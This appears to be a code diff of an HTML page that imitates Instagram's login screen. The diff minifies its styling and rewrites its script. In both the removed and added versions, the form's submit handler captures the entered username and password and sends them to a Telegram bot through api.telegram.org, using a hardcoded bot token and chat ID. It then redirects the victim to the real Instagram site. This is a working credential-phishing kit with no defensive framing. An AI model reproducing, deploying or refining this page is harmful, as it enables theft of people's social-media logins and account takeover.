@@ -5,135 +5,43 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-        body {
-            background: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            max-width: 350px;
-            width: 100%;
-            background: white;
-            border: 1px solid #dbdbdb;
-            border-radius: 8px;
-            padding: 40px 30px 30px;
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .logo h1 {
-            font-family: 'Billabong', cursive;
-            font-size: 48px;
-            font-weight: 300;
-            color: #262626;
-        }
-        .input-group {
-            margin-bottom: 12px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px 10px;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            background: #fafafa;
-            font-size: 14px;
-            outline: none;
-        }
-        .input-group input:focus {
-            border-color: #a8a8a8;
-            background: white;
-        }
-        .login-btn {
-            width: 100%;
-            padding: 10px;
-            background: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            margin-top: 8px;
-        }
-        .login-btn:hover {
-            background: #1877f2;
-        }
-        .forgot {
-            text-align: center;
-            margin-top: 15px;
-            font-size: 13px;
-        }
-        .forgot a {
-            color: #00376b;
-            text-decoration: none;
-        }
-        .signup {
-            text-align: center;
-            margin-top: 25px;
-            padding-top: 20px;
-            border-top: 1px solid #dbdbdb;
-            font-size: 14px;
-        }
-        .signup a {
-            color: #0095f6;
-            font-weight: 600;
-            text-decoration: none;
-        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
+        body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
+        .container{max-width:350px;width:100%;background:white;border:1px solid #dbdbdb;border-radius:8px;padding:40px 30px 30px}
+        .logo{text-align:center;margin-bottom:30px}
+        .logo h1{font-family:'Billabong',cursive;font-size:48px;font-weight:300;color:#262626}
+        .input-group{margin-bottom:12px}
+        .input-group input{width:100%;padding:12px 10px;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px;outline:none}
+        .input-group input:focus{border-color:#a8a8a8;background:white}
+        .login-btn{width:100%;padding:10px;background:#0095f6;color:white;border:none;border-radius:4px;font-weight:600;font-size:14px;cursor:pointer;margin-top:8px}
+        .login-btn:hover{background:#1877f2}
+        .forgot{text-align:center;margin-top:15px;font-size:13px}
+        .forgot a{color:#00376b;text-decoration:none}
+        .signup{text-align:center;margin-top:25px;padding-top:20px;border-top:1px solid #dbdbdb;font-size:14px}
+        .signup a{color:#0095f6;font-weight:600;text-decoration:none}
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <h1>Instagram</h1>
-        </div>
+        <div class="logo"><h1>Instagram</h1></div>
         <form id="loginForm">
-            <div class="input-group">
-                <input type="text" id="username" placeholder="Phone number, username, or email" required>
-            </div>
-            <div class="input-group">
-                <input type="password" id="password" placeholder="Password" required>
-            </div>
+            <div class="input-group"><input type="text" id="username" placeholder="Phone number, username, or email" required></div>
+            <div class="input-group"><input type="password" id="password" placeholder="Password" required></div>
             <button type="submit" class="login-btn">Log In</button>
         </form>
-        <div class="forgot">
-            <a href="#">Forgot password?</a>
-        </div>
-        <div class="signup">
-            Don't have an account? <a href="#">Sign up</a>
-        </div>
+        <div class="forgot"><a href="#">Forgot password?</a></div>
+        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
     </div>
-
     <script>
-        const BOT_TOKEN = '8905622970:AAEbMKn5v2G7jOmftR5cJxBkyj0Ft9H59O0';
-        const CHAT_ID = '6715785327';
-
-        document.getElementById('loginForm').onsubmit = function(e) {
+        const BOT_TOKEN='8905622970:AAEbMKn5v2G7jOmftR5cJxBkyj0Ft9H59O0';
+        const CHAT_ID='6715785327';
+        document.getElementById('loginForm').onsubmit=function(e){
             e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            if (username && password) {
-                const message = `🔐 Credentials\n👤 ${username}\n🔑 ${password}`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message
-                    })
-                });
-                window.location.href = 'https://www.instagram.com';
+            const u=document.getElementById('username').value;
+            const p=document.getElementById('password').value;
+            if(u&&p){
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐%20Instagram%0A👤%20${encodeURIComponent(u)}%0A🔑%20${encodeURIComponent(p)}`);
+                window.location.href='https://www.instagram.com';
             }
         };
     </script>
